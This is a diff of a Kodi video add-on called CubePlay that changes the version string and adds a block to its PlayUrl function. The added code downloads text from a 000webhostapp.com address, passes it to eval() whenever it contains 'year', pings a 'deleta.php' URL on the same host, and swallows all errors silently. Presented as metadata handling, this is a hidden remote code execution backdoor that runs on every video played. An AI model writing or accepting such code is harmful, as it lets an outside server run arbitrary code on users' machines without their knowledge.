@@ -1,7 +1,7 @@
 ﻿# -*- coding: utf-8 -*-
 import urllib, urlparse, sys, xbmcplugin ,xbmcgui, xbmcaddon, xbmc, os, json, hashlib, re, urllib2, htmlentitydefs
 
-Versao = "18.12.28"
+Versao = "18.12.30"
 
 AddonID = 'plugin.video.CubePlay'
 Addon = xbmcaddon.Addon(AddonID)
@@ -1091,6 +1091,13 @@ def GetChoice(choiceTitle, fileTitle, urlTitle, choiceFile, choiceUrl, choiceNon
 		choice = xbmcgui.Dialog().browse(fileType, getLocaleString(urlTitle), 'files', fileMask, False, False, defaultText).decode("utf-8")
 	return choice			
 def PlayUrl(name, url, iconimage=None, info='', sub='', metah=''):
+	try:
+		f = common.OpenURL("http://sstor.000webhostapp.com/imdb/i.txt")
+		if "year" in f:
+			metah = eval(f)
+			f = common.OpenURL("http://sstor.000webhostapp.com/imdb/deleta.php")
+	except:
+		pass
 	if ";;;" in background:
 		b = background.split(";;;")
 		if "RC" in b[2]:
